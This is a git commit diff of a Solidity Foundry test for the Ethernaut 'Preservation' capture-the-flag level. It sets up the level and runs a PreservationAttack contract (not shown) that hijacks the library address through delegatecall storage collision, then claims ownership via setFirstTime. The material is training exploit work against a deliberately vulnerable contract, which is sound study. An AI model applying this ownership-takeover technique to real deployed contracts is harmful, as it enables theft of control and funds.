6cb79965aa3c49b7eb7a2003510ff8409f350b21
sofinico <nicolettisofia1@gmail.com>
2024-05-16 18:07:29 +0200

    level: Preservation

--- test/Preservation.t.sol
+++ test/Preservation.t.sol
@@ -1,33 +1,66 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.0;
 
 import {Test} from "forge-std/Test.sol";
 import {Utils} from "./utils/Utils.sol";
 
-import {Preservation, LibraryContract} from "../src/levels/Preservation.sol";
+import {Preservation} from "../src/levels/Preservation.sol";
 import {PreservationFactory} from "../src/levels/PreservationFactory.sol";
 import {PreservationAttack} from "../src/attacks/PreservationAttack.sol";
 
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-address constant DEPLOYER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;
+contract TestPreservation is Test, Utils {
+    Ethernaut ethernaut;
+    Preservation instance;
 
-contract PreservationAttackTest is Test {
-    Preservation private preservation;
-    PreservationAttack private preservationAttack;
+    address payable owner;
+    address payable player;
 
+    /// @notice Create level instance.
     function setUp() public {
-        preservation = new Preservation(address(new LibraryContract()), address(new LibraryContract()));
-        preservationAttack = new PreservationAttack(address(preservation));
+        address payable[] memory users = createUsers(2);
+
+        owner = users[0];
+        vm.label(owner, "Owner");
+
+        player = users[1];
+        vm.label(player, "Player");
+
+        vm.startPrank(owner);
+        ethernaut = getEthernautWithStatsProxy(owner);
+        PreservationFactory factory = new PreservationFactory();
+        ethernaut.registerLevel(Level(address(factory)));
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        instance = Preservation(
+            payable(createLevelInstance(ethernaut, Level(address(factory)), 0))
+        );
+        vm.stopPrank();
     }
 
-    function testAttack() public {
-        preservationAttack.takeSlotZero();
-        assertEq(address(preservation.timeZone1Library()), address(preservationAttack));
+    /// @notice Check the intial state of the level and enviroment.
+    function testInit() public {
+        vm.startPrank(player);
+        assertFalse(submitLevelInstance(ethernaut, address(instance)));
+    }
 
-        // console.log("casted address -> uint256", uint256(uint160(DEPLOYER)));
-        preservation.setFirstTime(uint256(uint160(DEPLOYER)));
-        assertEq(preservation.owner(), DEPLOYER);
+    /// @notice Test the solution for the level.
+    function testSolve() public {
+        /// @notice This solution does not rely on the sender but on the argument to make the attack.
+        /// Hence, I don't need to prank.
+        PreservationAttack attack = new PreservationAttack(address(instance));
+
+        attack.takeSlotZero();
+        assertEq(address(instance.timeZone1Library()), address(attack));
+
+        // console.log("casted address -> uint256", uint256(uint160(address(player)));
+        instance.setFirstTime(uint256(uint160(address(player))));
+        assertEq(instance.owner(), player);
+
+        vm.prank(player);
+        assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
 }
